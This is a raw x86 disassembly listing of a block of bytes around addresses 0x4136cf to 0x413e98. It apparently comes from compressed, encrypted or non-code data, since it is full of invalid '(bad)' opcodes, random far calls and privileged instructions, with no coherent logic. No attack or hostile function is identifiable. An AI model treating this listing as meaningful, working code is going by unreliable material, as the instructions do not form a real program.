  4136cf:	fcomi  st,st(4)
  4136d1:	shl    DWORD PTR [eax],1
  4136d3:	cdq    
  4136d4:	pop    ebp
  4136d5:	and    eax,0x3b9325a2
  4136da:	pop    edi
  4136db:	add    al,0xa2
  4136dd:	adc    eax,0x1ae08b5a
  4136e2:	inc    ecx
  4136e3:	inc    edx
  4136e4:	mov    ds:0x8291aee2,eax
  4136e9:	fwait
  4136ea:	jo     0x4136e2
  4136ec:	dec    edi
  4136ed:	iret   
  4136ee:	push   cs
  4136ef:	clc    
  4136f0:	mov    dh,0xae
  4136f2:	xchg   esi,eax
  4136f3:	bound  esp,QWORD PTR [edx+0x366f0934]
  4136f9:	test   al,0xf2
  4136fb:	aam    0xbe
  4136fd:	cmp    ecx,DWORD PTR [ebp+0x24]
  413700:	push   ss
  413701:	js     0x41368e
  413703:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413704:	sub    ch,BYTE PTR [ebx]
  413706:	sbb    DWORD PTR [ebx+0x2],ebp
  413709:	mov    bh,0x46
  41370b:	adc    BYTE PTR ds:0xd07ec061,dl
  413711:	fs jne 0x4136de
  413714:	mov    ebx,0x27f70873
  413719:	in     al,dx
  41371a:	int    0x3f
  41371c:	dec    edi
  41371d:	jg     0x4136da
  41371f:	jae    0x413720
  413721:	fs retf 0xfc04
  413725:	(bad)  
  413726:	push   0xb6cdf296
  41372b:	mov    BYTE PTR [edx-0x3591ac52],al
  413731:	cmp    ebx,DWORD PTR [esi+0x5f12dff0]
  413737:	pop    esi
  413738:	inc    ebx
  413739:	mov    eax,0xf5789a69
  41373e:	push   ebx
  41373f:	xor    al,0x91
  413741:	cwde   
  413742:	cwde   
  413743:	mov    WORD PTR [ecx+edx*8+0x32],es
  413747:	sar    BYTE PTR [edi],1
  413749:	leave  
  41374a:	in     al,0x51
  41374c:	xchg   DWORD PTR [edx-0x3],esp
  41374f:	jbe    0x413768
  413751:	cdq    
  413752:	test   BYTE PTR [edi+0x42aaae0c],ch
  413758:	jle    0x4136f1
  41375a:	icebp  
  41375b:	mov    al,ds:0x4a7f5a1a
  413760:	cmp    edi,DWORD PTR [ecx-0x9584451]
  413766:	and    eax,0x8d59e0b9
  41376b:	(bad)  
  41376d:	daa    
  41376e:	or     BYTE PTR [ebx],0x4a
  413771:	jb     0x413797
  413773:	arpl   WORD PTR [edx+0x5a],bx
  413776:	or     eax,0x6ec7ad6d
  41377b:	sub    al,0x3b
  41377d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41377e:	xchg   esi,eax
  41377f:	push   eax
  413780:	add    eax,0xb593d932
  413785:	sbb    eax,0xa8a0663d
  41378a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41378b:	retf   0x3cca
  41378e:	fwait
  41378f:	xor    esi,esi
  413791:	les    eax,FWORD PTR [ecx]
  413793:	cmc    
  413794:	xor    DWORD PTR [edi+0x7597ae8c],ecx
  41379a:	(bad)  
  41379b:	int3   
  41379c:	sti    
  41379d:	xor    cl,ah
  41379f:	push   ss
  4137a0:	xchg   DWORD PTR fs:[ebp+0x43c50b1c],esi
  4137a7:	je     0x41378d
  4137a9:	dec    ebx
  4137aa:	cmp    eax,0x8c0b36d9
  4137af:	ret    0x1425
  4137b2:	call   0xf25b:0x1c6491b9
  4137b9:	lock out dx,eax
  4137bb:	dec    edi
  4137bc:	call   0xba4f059
  4137c1:	cmp    BYTE PTR [esi+0x29],dh
  4137c4:	jbe    0x413770
  4137c6:	lods   eax,DWORD PTR ds:[esi]
  4137c7:	xchg   ebp,eax
  4137c8:	cmp    bl,BYTE PTR [esp+esi*1+0x6350e003]
  4137cf:	mov    al,0x69
  4137d1:	cmp    ecx,DWORD PTR [edi+0x29]
  4137d4:	sete   BYTE PTR [eax+0x4]
  4137d8:	sahf   
  4137d9:	nop
  4137da:	push   0xb4a6b191
  4137df:	cmp    dh,BYTE PTR [edi]
  4137e1:	mov    dh,0x83
  4137e3:	jnp    0x41380d
  4137e5:	mov    edi,0x3ab08304
  4137ea:	dec    ebp
  4137eb:	mov    cl,0x2
  4137ed:	aad    0x22
  4137ef:	rcl    DWORD PTR [eax+edi*1],cl
  4137f2:	stc    
  4137f3:	push   edx
  4137f4:	mov    BYTE PTR [edx-0x76],0xd0
  4137f8:	rcr    esi,cl
  4137fa:	inc    ecx
  4137fb:	or     DWORD PTR [ebx+0x46],eax
  4137fe:	std    
  4137ff:	cld    
  413800:	cmc    
  413801:	pop    edi
  413802:	cmp    dl,BYTE PTR [ebp+0x6e]
  413805:	test   DWORD PTR [esi+eiz*4-0x580433b6],eax
  41380c:	mov    esi,0x67af4d84
  413811:	out    dx,al
  413812:	loop   0x4137fd
  413814:	(bad)  [edi-0x69]
  413817:	jge    0x4137b5
  413819:	aaa    
  41381a:	lods   eax,DWORD PTR ds:[esi]
  41381b:	mov    bh,dh
  41381d:	inc    edi
  41381e:	mov    ebx,0xf0d218d5
  413823:	jae    0x4137c5
  413825:	pop    ebp
  413826:	les    eax,FWORD PTR [ebx-0x34]
  413829:	xchg   BYTE PTR [eax+0x52],dl
  41382c:	arpl   di,bx
  41382e:	clc    
  41382f:	js     0x413844
  413831:	inc    edx
  413832:	repnz aam 0xba
  413835:	test   ch,al
  413837:	mov    ebx,0x941c5d4b
  41383c:	loop   0x4138a1
  41383e:	in     al,dx
  41383f:	mov    ss,WORD PTR ds:0xdd581b22
  413845:	std    
  413846:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413847:	mov    ch,0x7e
  413849:	mov    esi,0x11e34fca
  41384e:	sti    
  41384f:	lods   al,BYTE PTR ds:[esi]
  413850:	jnp    0x4138c7
  413852:	ins    BYTE PTR es:[edi],dx
  413853:	mov    ecx,0xc6f4a5f3
  413858:	ret    0x9780
  41385b:	sub    bl,dl
  41385d:	and    DWORD PTR [edi+0x13a905c4],esp
  413863:	inc    esp
  413864:	aaa    
  413865:	pop    edx
  413866:	add    ch,cl
  413868:	scas   al,BYTE PTR es:[edi]
  413869:	xor    al,0x61
  41386b:	xchg   esp,eax
  41386c:	cmp    eax,0xda3781ce
  413871:	adc    al,0x62
  413873:	call   0x5b9a:0xb759b21e
  41387a:	jecxz  0x413893
  41387c:	mov    dl,0x4a
  41387e:	and    bh,0xb
  413881:	pop    esp
  413882:	xor    eax,0x8bcd6d8a
  413887:	jl     0x4138e1
  413889:	lahf   
  41388a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41388b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41388c:	xor    dl,0x3a
  41388f:	mov    WORD PTR [eax],gs
  413891:	inc    ebx
  413892:	dec    ecx
  413893:	xchg   DWORD PTR [esp+edx*2],ebx
  413896:	nop
  413897:	mov    esi,0xdd446a14
  41389c:	jno    0x4138f3
  41389e:	jp     0x41383d
  4138a0:	push   0x27e9357
  4138a5:	jecxz  0x41390f
  4138a7:	rcr    DWORD PTR [edx],1
  4138a9:	push   es
  4138aa:	sub    edi,0x30688d11
  4138b0:	sbb    eax,0x7f7217e4
  4138b5:	cld    
  4138b6:	and    DWORD PTR [ebx],esi
  4138b8:	je     0x41392c
  4138ba:	mov    dl,BYTE PTR [esi-0x6a977e88]
  4138c0:	and    BYTE PTR [eax+0x1f],0x88
  4138c4:	add    al,0x99
  4138c6:	xor    al,0xdb
  4138c8:	dec    esi
  4138c9:	pop    eax
  4138ca:	push   ecx
  4138cb:	leave  
  4138cc:	dec    ebx
  4138cd:	sbb    eax,0xcbe12ef0
  4138d2:	cmp    esp,DWORD PTR [edi-0x2a923e51]
  4138d8:	nop
  4138d9:	push   ebp
  4138da:	por    mm3,QWORD PTR [edx]
  4138dd:	dec    ecx
  4138de:	lods   eax,DWORD PTR ds:[esi]
  4138df:	jbe    0x413861
  4138e1:	lds    esi,FWORD PTR ss:[ecx]
  4138e4:	jp     0x413953
  4138e6:	fbld   TBYTE PTR [edx+0x26]
  4138e9:	mov    bl,0xc
  4138eb:	mov    BYTE PTR [ebx-0x38],dh
  4138ee:	(bad)  
  4138f0:	gs loop 0x41395f
  4138f3:	jmp    0x41391c
  4138f5:	mov    dh,0x66
  4138f7:	outs   dx,DWORD PTR ds:[esi]
  4138f8:	mov    eax,0x7b23e814
  4138fd:	ret    
  4138fe:	les    edi,FWORD PTR es:[edi+0x6]
  413902:	cmp    ebp,DWORD PTR [ebx-0x30]
  413905:	fidiv  WORD PTR [ecx+eiz*2-0x18]
  413909:	(bad)  
  41390a:	mov    edx,0x67e13821
  41390f:	mov    esp,0x4373571
  413914:	pusha  
  413915:	fwait
  413916:	leave  
  413917:	(bad)  
  413918:	repnz mov DWORD PTR [ecx+0x1432c7db],0x3d666d92
  413923:	xor    bh,dl
  413925:	das    
  413926:	push   eax
  413927:	add    bh,BYTE PTR [edi+0x58]
  41392a:	sbb    DWORD PTR [edi],ebp
  41392c:	aaa    
  41392d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41392e:	push   ebx
  41392f:	push   edi
  413930:	shr    BYTE PTR [edi+0x2e9a95f6],0x14
  413937:	push   0x6d
  413939:	mov    esi,0xce78247d
  41393e:	in     al,dx
  41393f:	out    0xd8,eax
  413941:	mov    DWORD PTR [ebx],eax
  413943:	xchg   esp,eax
  413944:	adc    eax,0xef110c4d
  413949:	adc    eax,DWORD PTR ds:0x9a2b0a60
  41394f:	adc    eax,0x9a5fe15c
  413954:	pop    edi
  413955:	and    edx,DWORD PTR [eax+0x1810c8fc]
  41395b:	retf   
  41395c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41395d:	cld    
  41395e:	loope  0x4138e2
  413960:	jnp    0x4139dc
  413962:	push   cs
  413963:	add    al,0x41
  413965:	pop    edx
  413966:	(bad)  
  413967:	mov    ?,WORD PTR [edx+0x43]
  41396a:	add    dh,BYTE PTR [edx-0x5c1fa654]
  413970:	push   cs
  413971:	mov    ah,0xc6
  413973:	xor    al,BYTE PTR [edi]
  413975:	jmp    0x24e4:0x51b25d02
  41397c:	cmp    esi,ebx
  41397e:	loopne 0x4139b2
  413980:	dec    ebp
  413981:	pushf  
  413982:	push   ebx
  413983:	or     DWORD PTR [ebx],edx
  413985:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413986:	sub    al,BYTE PTR [esi]
  413988:	sahf   
  413989:	sbb    al,0x48
  41398b:	push   edx
  41398c:	loop   0x41392f
  41398e:	lds    esi,FWORD PTR [ebx+0x66]
  413991:	xchg   esp,eax
  413992:	int3   
  413993:	aad    0x69
  413995:	scas   eax,DWORD PTR es:[edi]
  413996:	and    eax,0xdd32f470
  41399b:	pop    eax
  41399c:	pop    edx
  41399d:	dec    esp
  41399e:	imul   esi,ebp,0xe5bbcf98
  4139a4:	cwde   
  4139a5:	adc    ch,BYTE PTR [eax+0x23]
  4139a8:	cmp    al,0x3c
  4139aa:	pop    es
  4139ab:	scas   al,BYTE PTR es:[edi]
  4139ac:	mov    ebx,DWORD PTR [eax-0x883ea00]
  4139b2:	mov    ch,0x59
  4139b4:	pop    eax
  4139b5:	pop    ecx
  4139b6:	adc    bh,BYTE PTR [edi+0x3e]
  4139b9:	xor    eax,0x2e4fb3a7
  4139be:	push   ds
  4139bf:	dec    ebx
  4139c0:	jbe    0x4139be
  4139c2:	cmovp  esp,edi
  4139c5:	ret    0xd2e2
  4139c8:	cli    
  4139c9:	repnz mov ecx,0x567a4d6c
  4139cf:	pop    ebx
  4139d0:	out    0x96,eax
  4139d2:	xor    bl,BYTE PTR [esi-0x2398ab03]
  4139d8:	fwait
  4139d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139da:	pop    esp
  4139db:	retf   
  4139dc:	ret    0x1bd2
  4139df:	xchg   esi,eax
  4139e0:	jnp    0x413a37
  4139e2:	jbe    0x413a18
  4139e4:	stc    
  4139e5:	sbb    edi,0x2f
  4139e8:	push   es
  4139e9:	add    DWORD PTR [esi],eax
  4139eb:	mov    edx,0x67c819a6
  4139f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139f1:	rcl    BYTE PTR [ebx-0x48736f69],cl
  4139f7:	dec    eax
  4139f8:	scas   al,BYTE PTR es:[edi]
  4139f9:	pop    esi
  4139fa:	rol    BYTE PTR [ebp+0x273251e2],0x74
  413a01:	outs   dx,DWORD PTR ds:[esi]
  413a02:	jmp    0x28ce:0xb2a4b193
  413a09:	cmp    al,0x7b
  413a0b:	sbb    eax,DWORD PTR [edx+0x10]
  413a0e:	mov    cl,0x60
  413a10:	scas   eax,DWORD PTR es:[edi]
  413a11:	jle    0x413a4f
  413a13:	call   0x116d:0xd2a3713b
  413a1a:	das    
  413a1b:	mov    ebp,0xd0206b3a
  413a20:	push   es
  413a21:	sub    ecx,ebp
  413a23:	add    BYTE PTR [esi+0x2f147c90],dl
  413a29:	sbb    edx,DWORD PTR [ebp+0x6938f99a]
  413a2f:	imul   ebp,DWORD PTR [eax-0x25062795],0xce3e10c8
  413a39:	sti    
  413a3a:	add    al,0x59
  413a3c:	mov    dh,0x6b
  413a3e:	mov    DWORD PTR [eax+ebp*8],ecx
  413a41:	cmp    esi,DWORD PTR [eax-0x211231a3]
  413a47:	stos   BYTE PTR es:[edi],al
  413a48:	sbb    al,0x9
  413a4a:	popa   
  413a4b:	cmp    esi,DWORD PTR [edx-0x13]
  413a4e:	xor    cl,BYTE PTR [ebx]
  413a50:	ret    0xac44
  413a53:	xchg   sp,ax
  413a55:	in     eax,dx
  413a56:	imul   esi,DWORD PTR [esp+edx*8+0x39e035a2],0xffffffd2
  413a5e:	add    al,BYTE PTR [esi]
  413a60:	jno    0x413a6e
  413a62:	cmp    bl,BYTE PTR [ecx+0x22b6d39e]
  413a68:	lds    edx,FWORD PTR ds:0xe0bd1532
  413a6e:	int    0x18
  413a70:	and    eax,0x319f6327
  413a75:	xchg   edx,eax
  413a76:	(bad)  
  413a77:	fbstp  TBYTE PTR [ebx]
  413a79:	xchg   ebp,eax
  413a7a:	bound  esp,QWORD PTR [esi+0x32e6a746]
  413a80:	jb     0x413ace
  413a82:	leave  
  413a83:	retf   0xa28c
  413a86:	imul   esp,DWORD PTR [edi+0x22b926b0],0x6d
  413a8d:	popf   
  413a8e:	xchg   esi,eax
  413a8f:	inc    edi
  413a90:	(bad)  
  413a91:	test   DWORD PTR [ecx],0x41abd53b
  413a97:	and    eax,0x6a6b67d4
  413a9c:	push   edi
  413a9d:	nop
  413a9e:	mov    eax,0x9c3d5750
  413aa3:	or     DWORD PTR [edi-0x57],edi
  413aa6:	add    eax,0xb391df13
  413aab:	call   FWORD PTR [ebp+eax*1-0x48]
  413aaf:	sub    eax,0x1333fcca
  413ab4:	mov    ch,0xef
  413ab6:	adc    al,0xc5
  413ab8:	push   edi
  413ab9:	in     eax,dx
  413aba:	jge    0x413a48
  413abc:	mov    ebx,DWORD PTR [ecx]
  413abe:	nop
  413abf:	cmp    dh,al
  413ac1:	dec    ebx
  413ac2:	cmp    BYTE PTR [edx-0x1b10fea3],dh
  413ac8:	cmp    DWORD PTR [ebp-0x5105bbb1],edx
  413ace:	scas   eax,DWORD PTR es:[edi]
  413acf:	test   DWORD PTR [esi],eax
  413ad1:	inc    ebp
  413ad2:	xchg   esi,eax
  413ad3:	cmp    bl,BYTE PTR [esi]
  413ad5:	mov    al,ds:0x8e6cdc68
  413ada:	push   ebx
  413adb:	enter  0x2ada,0x1d
  413adf:	lea    ebp,[esi]
  413ae1:	jo     0x413ab2
  413ae3:	push   esi
  413ae4:	xlat   BYTE PTR ds:[ebx]
  413ae5:	shl    BYTE PTR [esi-0x79],cl
  413ae8:	xor    al,BYTE PTR [ebp-0x4664c78b]
  413aee:	push   es
  413aef:	mov    ah,0x89
  413af1:	out    0x79,eax
  413af3:	pop    ebx
  413af4:	ss jb  0x413ace
  413af7:	aaa    
  413af8:	jmp    0x413ace
  413afa:	ret    
  413afb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413afc:	ret    0xc482
  413aff:	dec    esp
  413b00:	popf   
  413b01:	cmp    ebx,edx
  413b03:	js     0x413ab1
  413b05:	mov    esi,0xbc168727
  413b0a:	sbb    BYTE PTR [ebx],0xb6
  413b0d:	outs   dx,BYTE PTR ds:[esi]
  413b0e:	dec    esi
  413b0f:	lods   al,BYTE PTR ds:[esi]
  413b10:	cmp    eax,0x4ccf6763
  413b15:	push   ebp
  413b16:	and    bl,BYTE PTR [edi+0x41]
  413b19:	mov    eax,ds:0x31dbe9f7
  413b1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b1f:	inc    edx
  413b20:	aam    0x3
  413b22:	clc    
  413b23:	scas   eax,DWORD PTR es:[edi]
  413b24:	mov    ebp,0x11504fa0
  413b29:	mov    DWORD PTR [edi+0x1b],eax
  413b2c:	inc    edi
  413b2d:	fs xchg esi,eax
  413b2f:	mov    eax,ds:0x93749d04
  413b34:	dec    eax
  413b35:	(bad)  
  413b37:	call   0x32c8aff9
  413b3c:	inc    ecx
  413b3d:	jnp    0x413b45
  413b3f:	test   eax,0x11eeb339
  413b44:	clc    
  413b45:	in     al,dx
  413b46:	jb     0x413b1c
  413b48:	jmp    0xa6f9af80
  413b4d:	movsx  ebp,si
  413b50:	out    0xb8,al
  413b52:	or     al,0x5a
  413b54:	push   ds
  413b55:	xchg   ecx,eax
  413b56:	push   cs
  413b57:	push   eax
  413b58:	push   0x7028cfcf
  413b5d:	jmp    0x413bd7
  413b5f:	mov    al,ds:0x71e8c449
  413b64:	sbb    eax,0x272bddd2
  413b69:	cmp    ebp,DWORD PTR [edi]
  413b6b:	pop    ds
  413b6c:	xor    al,0x26
  413b6e:	dec    eax
  413b6f:	mov    bh,0xef
  413b71:	mov    bh,0x32
  413b73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b74:	ror    BYTE PTR ds:[edi-0x71],cl
  413b78:	push   eax
  413b79:	(bad)
  413b7d:	in     eax,dx
  413b7e:	sbb    eax,0x60c5bddf
  413b83:	lods   al,BYTE PTR ds:[esi]
  413b84:	xchg   ebx,eax
  413b85:	add    eax,0x6e0cbbf2
  413b8a:	jecxz  0x413b84
  413b8c:	or     al,0x12
  413b8e:	xor    al,0x37
  413b90:	cmp    BYTE PTR [ecx+ebx*2-0x7e],cl
  413b94:	and    eax,0x591daec9
  413b99:	xor    al,BYTE PTR [ebp-0x3d]
  413b9c:	mov    BYTE PTR [ebx-0x6f],ah
  413b9f:	in     eax,dx
  413ba0:	int    0x26
  413ba2:	not    BYTE PTR es:[edi+0x49]
  413ba6:	jnp    0x413c1f
  413ba8:	enter  0x47f0,0x63
  413bac:	call   0xea79:0xac87b2fb
  413bb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bb4:	mov    ch,0x52
  413bb6:	push   edi
  413bb7:	dec    esp
  413bb8:	jbe    0x413ba4
  413bba:	pop    ebx
  413bbb:	(bad)  
  413bbc:	and    esi,DWORD PTR [edi-0xf50989a]
  413bc2:	(bad)  
  413bc3:	mov    eax,0x329cdb71
  413bc8:	call   0xfae7:0xa6517c9b
  413bcf:	inc    edi
  413bd0:	sbb    eax,0x8dcb0ee3
  413bd5:	in     al,dx
  413bd6:	aas    
  413bd7:	and    eax,0xa39f1f19
  413bdc:	cli    
  413bdd:	pop    esi
  413bde:	push   ebp
  413bdf:	or     bl,BYTE PTR [edi-0x37afce9e]
  413be5:	xor    ch,BYTE PTR [eax+eiz*4]
  413be8:	dec    esi
  413be9:	or     eax,0xb780b091
  413bee:	xor    edx,0x47
  413bf1:	fnstenv [edx+0x24]
  413bf4:	hlt    
  413bf5:	ret    0xfa82
  413bf8:	push   es
  413bf9:	pop    ebx
  413bfa:	fst    QWORD PTR ds:[ebp+0x1a90d6b8]
  413c01:	mov    WORD PTR [eax+ebp*4],ss
  413c04:	idiv   DWORD PTR [ecx+0x31aed599]
  413c0a:	xchg   edx,eax
  413c0b:	add    DWORD PTR [ecx-0x496aa3a5],eax
  413c11:	jle    0x413c88
  413c13:	cmp    al,bh
  413c15:	mov    dh,0x50
  413c17:	dec    esp
  413c18:	cmp    eax,DWORD PTR [edi-0x3ae4f7]
  413c1e:	jecxz  0x413c48
  413c20:	shl    BYTE PTR [eax],cl
  413c22:	push   esp
  413c23:	mov    ebp,DWORD PTR [ecx]
  413c25:	push   edi
  413c26:	idiv   BYTE PTR [ebx-0x224a9003]
  413c2c:	clc    
  413c2d:	imul   eax,DWORD PTR [ebx-0x21f38393],0xfffffff6
  413c34:	in     eax,0x20
  413c36:	jnp    0x413c71
  413c38:	not    dl
  413c3a:	adc    BYTE PTR [esi],0xac
  413c3d:	imul   esi,DWORD PTR [edi-0x77a384b6],0x70
  413c44:	ds int 0xef
  413c47:	pop    ebx
  413c48:	(bad)  
  413c4c:	xor    BYTE PTR [ecx+0x595dfbc1],0xf5
  413c53:	xchg   ebp,eax
  413c54:	retf   0x1c5f
  413c57:	out    dx,al
  413c58:	push   ecx
  413c59:	push   cs
  413c5a:	arpl   WORD PTR [esi-0x23],si
  413c5d:	pop    esp
  413c5e:	jl     0x413cbf
  413c60:	push   ds
  413c61:	fdivp  st(1),st
  413c63:	push   esi
  413c64:	pop    edx
  413c65:	arpl   bp,si
  413c67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c68:	call   0x8a72:0x121faf1f
  413c6f:	outs   dx,DWORD PTR ds:[esi]
  413c70:	push   fs
  413c72:	xrstors [edx-0xf]
  413c76:	mov    ebp,0x1673f816
  413c7b:	das    
  413c7c:	mov    dh,ch
  413c7e:	and    al,0x62
  413c80:	adc    DWORD PTR [ebx-0x56],ebp
  413c83:	pop    esp
  413c84:	idiv   DWORD PTR [eax]
  413c86:	or     eax,0xbb3d2243
  413c8b:	mul    ebp
  413c8d:	sbb    ebp,DWORD PTR [ebx+0x38]
  413c90:	sbb    eax,0x2704e56e
  413c95:	mov    cs,WORD PTR [edi-0x60]
  413c98:	inc    esi
  413c99:	mov    ds:0xe4bb64d6,eax
  413c9e:	xchg   edi,eax
  413c9f:	xchg   ecx,eax
  413ca0:	call   0xad51:0xb32a2448
  413ca7:	cmp    ch,BYTE PTR [edx+0x13]
  413caa:	cmp    al,0x44
  413cac:	and    ebx,esp
  413cae:	rcl    DWORD PTR [edx+0x1e],cl
  413cb1:	xor    BYTE PTR [ebx],ah
  413cb3:	(bad)  
  413cb4:	pop    eax
  413cb5:	dec    edi
  413cb6:	in     al,0x27
  413cb8:	pop    es
  413cb9:	xchg   esi,eax
  413cba:	inc    ecx
  413cbb:	mov    eax,ebp
  413cbd:	jle    0x413d31
  413cbf:	jmp    0xd325:0x552f6feb
  413cc6:	dec    esp
  413cc7:	sub    DWORD PTR [edx-0x3b],esp
  413cca:	and    dh,BYTE PTR [edx+0x1]
  413ccd:	nop
  413cce:	inc    esi
  413ccf:	lahf   
  413cd0:	out    0xa6,al
  413cd2:	sbb    eax,0xef94e8e6
  413cd7:	sub    eax,0x3c525b57
  413cdc:	nop
  413cdd:	mov    WORD PTR [esi],?
  413cdf:	lds    ecx,FWORD PTR [ebp-0x3f]
  413ce2:	rcr    ebx,0xf8
  413ce5:	lods   al,BYTE PTR ds:[esi]
  413ce6:	jg     0x413ca0
  413ce8:	loop   0x413d67
  413cea:	shl    BYTE PTR [eax-0x11],1
  413ced:	xor    DWORD PTR [ebp-0x16],ebp
  413cf0:	xchg   ecx,eax
  413cf1:	sbb    DWORD PTR [esi],edx
  413cf3:	cmp    bh,BYTE PTR [edx+ebp*1]
  413cf6:	je     0x413d2e
  413cf8:	adc    DWORD PTR [ecx],ebp
  413cfa:	lea    ebp,[esi]
  413cfc:	imul   ebp,ebx,0x920ebd3b
  413d02:	popf   
  413d03:	std    
  413d04:	data16 fwait
  413d06:	adc    edi,DWORD PTR [esi-0x62]
  413d09:	adc    edx,DWORD PTR [ebx]
  413d0b:	sbb    al,0x67
  413d0d:	sub    eax,0x2f925e9f
  413d12:	ror    BYTE PTR [eax],1
  413d14:	(bad)  
  413d15:	cs push ss
  413d17:	xchg   edx,eax
  413d18:	rcr    BYTE PTR [esp+edi*2+0x23],0x67
  413d1d:	jns    0x413cb7
  413d1f:	xchg   DWORD PTR es:[edi],edi
  413d22:	pusha  
  413d23:	(bad)  
  413d24:	adc    DWORD PTR [esi],edx
  413d26:	xchg   edx,eax
  413d27:	push   esi
  413d28:	ins    BYTE PTR es:[edi],dx
  413d29:	jecxz  0x413d8e
  413d2b:	pop    edi
  413d2c:	mov    cl,0x18
  413d2e:	cwde   
  413d2f:	fwait
  413d30:	lock ja 0x413cd4
  413d33:	xchg   edi,eax
  413d34:	xchg   ecx,eax
  413d35:	add    eax,0x746f7531
  413d3a:	dec    esp
  413d3b:	and    esi,DWORD PTR [eax+edx*2]
  413d3e:	data16 cli 
  413d40:	js     0x413d62
  413d42:	and    al,0xa9
  413d44:	add    eax,0xb3f4b286
  413d49:	push   esi
  413d4a:	hlt    
  413d4b:	push   edi
  413d4c:	das    
  413d4d:	dec    edi
  413d4e:	jp     0x413db5
  413d50:	xor    DWORD PTR [esi-0x1cbd6617],esp
  413d56:	pop    ecx
  413d57:	mov    ch,0xfa
  413d59:	daa    
  413d5a:	jge    0x413d51
  413d5c:	jno    0x413cee
  413d5e:	sub    ch,ah
  413d60:	call   0xdeb7:0x57956da1
  413d67:	loope  0x413dce
  413d69:	jmp    0xf9e4:0x5bb07a6
  413d70:	adc    BYTE PTR [ebx+0x5092832a],al
  413d76:	fucom  st(3)
  413d78:	lock lods eax,DWORD PTR ds:[esi]
  413d7b:	sub    cl,BYTE PTR [edx+0x1f]
  413d7e:	and    ebp,DWORD PTR [edx-0x57]
  413d81:	icebp  
  413d82:	sbb    al,0xe9
  413d84:	and    al,0x3e
  413d86:	cwde   
  413d87:	fcmovb st,st(6)
  413d89:	adc    edi,DWORD PTR [ecx+0x70effd6c]
  413d8f:	or     al,dh
  413d91:	dec    ebx
  413d92:	in     al,0x3d
  413d94:	and    al,0x44
  413d96:	ret    0xca4a
  413d99:	dec    esp
  413d9a:	jge    0x413d97
  413d9c:	test   eax,0x6318831d
  413da1:	pop    edi
  413da2:	mov    ebp,0x3194f0c8
  413da7:	xor    DWORD PTR [eax],ecx
  413da9:	out    0x48,eax
  413dab:	mov    cl,0xfb
  413dad:	rol    DWORD PTR [ebp+0x41f7434e],cl
  413db3:	xor    ecx,0x4f
  413db6:	mov    bl,0x49
  413db8:	arpl   si,bx
  413dba:	xchg   esi,eax
  413dbb:	cs push ebp
  413dbd:	ss push es
  413dbf:	icebp  
  413dc0:	sar    BYTE PTR [edi-0x70b94695],0xb4
  413dc7:	push   es
  413dc8:	fist   DWORD PTR [edx]
  413dca:	cmc    
  413dcb:	mov    ecx,0xd4426e11
  413dd0:	inc    esi
  413dd1:	xor    edx,DWORD PTR [eax]
  413dd3:	mov    eax,ds:0x2b64b2ba
  413dd8:	mov    esp,eax
  413dda:	mov    es,WORD PTR [edi+0x2938118a]
  413de0:	test   al,0xb4
  413de2:	inc    ebp
  413de3:	idiv   dl
  413de5:	and    edi,eax
  413de7:	je     0x413db5
  413de9:	jmp    0x786a:0x5987e688
  413df0:	sbb    ebx,edx
  413df2:	mov    bh,0x29
  413df4:	sub    esi,DWORD PTR [edx-0x1b83e11c]
  413dfa:	pop    ds
  413dfb:	test   DWORD PTR [eax],esi
  413dfd:	sub    edx,esi
  413dff:	sub    ebx,edx
  413e01:	pop    edx
  413e02:	cmp    eax,DWORD PTR [ebx+esi*1+0x54503f30]
  413e09:	test   al,0x20
  413e0b:	push   es
  413e0c:	jnp    0x413dde
  413e0e:	push   ss
  413e0f:	xor    BYTE PTR [ecx-0x1e467a39],bh
  413e15:	mov    esi,0x476eaec2
  413e1a:	pop    ss
  413e1b:	lds    ebx,FWORD PTR [edx+0x4c]
  413e1e:	pop    esi
  413e1f:	fldenv [ecx+eax*8]
  413e22:	adc    DWORD PTR [eiz*8-0x1b8aa797],0xa63037df
  413e2d:	es xchg edi,eax
  413e2f:	mov    ecx,0x1b0f808a
  413e34:	and    dh,BYTE PTR [ecx]
  413e36:	mov    eax,ds:0xa0387d83
  413e3b:	push   ss
  413e3c:	add    ecx,DWORD PTR [ecx+0x65dfd5b9]
  413e42:	mov    bh,0xf6
  413e44:	and    al,0x55
  413e46:	dec    ebp
  413e47:	add    ah,dl
  413e49:	push   ecx
  413e4a:	push   ebp
  413e4b:	jle    0x413e67
  413e4d:	jo     0x413dd6
  413e4f:	xchg   DWORD PTR [eax],edx
  413e51:	xchg   BYTE PTR [edi],cl
  413e53:	ds jg  0x413e68
  413e56:	push   ecx
  413e57:	mov    ?,WORD PTR [ebp+0x56]
  413e5a:	es iret 
  413e5c:	push   ss
  413e5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e5e:	inc    ebx
  413e5f:	imul   DWORD PTR [ecx+eax*1]
  413e62:	jmp    0x85f9:0xec79a72b
  413e69:	and    DWORD PTR [ebx-0x68],edi
  413e6c:	ret    
  413e6d:	mov    edx,edi
  413e6f:	xchg   ecx,eax
  413e70:	inc    ebx
  413e71:	pop    ebp
  413e72:	stc    
  413e73:	push   ss
  413e74:	leave  
  413e75:	ret    
  413e76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e77:	xchg   esp,eax
  413e78:	inc    esp
  413e79:	add    ah,dh
  413e7b:	(bad)  
  413e7c:	call   0x7adc1a45
  413e81:	mov    ebp,0x144d51ae
  413e86:	repnz mov esi,0x2f20a921
  413e8c:	fscale 
  413e8e:	aaa    
  413e8f:	xchg   DWORD PTR [ebx+0x8],ecx
  413e92:	fbld   TBYTE PTR [eax-0x570f22d7]
  413e98:	sbb    al,0xda
